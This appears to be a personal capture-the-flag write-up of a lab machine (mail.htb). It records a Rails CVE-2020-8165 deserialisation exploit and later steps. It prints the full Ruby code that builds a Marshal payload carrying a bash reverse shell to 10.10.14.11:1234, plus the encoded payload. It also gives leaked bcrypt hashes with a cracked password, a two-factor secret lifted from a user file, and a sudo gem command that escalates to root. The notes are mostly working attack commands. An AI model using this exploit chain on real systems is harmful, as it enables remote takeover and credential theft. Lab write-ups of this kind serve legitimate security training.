![[Pasted image 20250222180609.png]]
we found vulnerable verison on rails
we use this script to get rce https://github.com/masahiro331/CVE-2020-8165?tab=readme-ov-file

apt install rails
rails new exploit
cd exploit
rails console

code='`/bin/bash -c "bash -i &>/dev/tcp/10.10.14.11/1234 0>&1"`'
erb=ERB.allocate
erb.instance_variable_set:@src, code
erb.instance_variable_set:@filename, "1"
erb.instance_variable_set:@lineno, 1
payload=Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb,:result)
require'uri'
puts URI.encode_www_form(payload:payload)

we get that payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3E%60%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.11%2F1234+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T

then we found vulnerable parametr
![[Pasted image 20250222215855.png]]
![[Pasted image 20250222215911.png]]
that parametr has in edit profile page
![[Pasted image 20250222222111.png]]
we get shell
![[Pasted image 20250222222137.png]]

in backups we found new hash in /var/backups/dump_2020-08-27.sql
COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;
2       jennifer        jennifer@mail.htb       2020-08-27 05:44:28.551735      2020-08-27 05:44:28.551735 $2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
1       bill    bill@mail.htb   2020-08-26 10:24:03.878232      2020-08-27 09:18:11.636483      $2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW

and we can crack it for bill user
result:spongebob

this verification code we found it in root dir user bill in file .google_authenticator:
2UQI3R52WFCLE6JTLDCSJYMJH4
we add this code in google authenticator app 
then we list sudo privileges:
![[Pasted image 20250222225450.png]]
https://gtfobins.github.io/gtfobins/gem/
sudo /usr/bin/gem open -e "/bin/sh -c /bin/sh" rdoc
we get root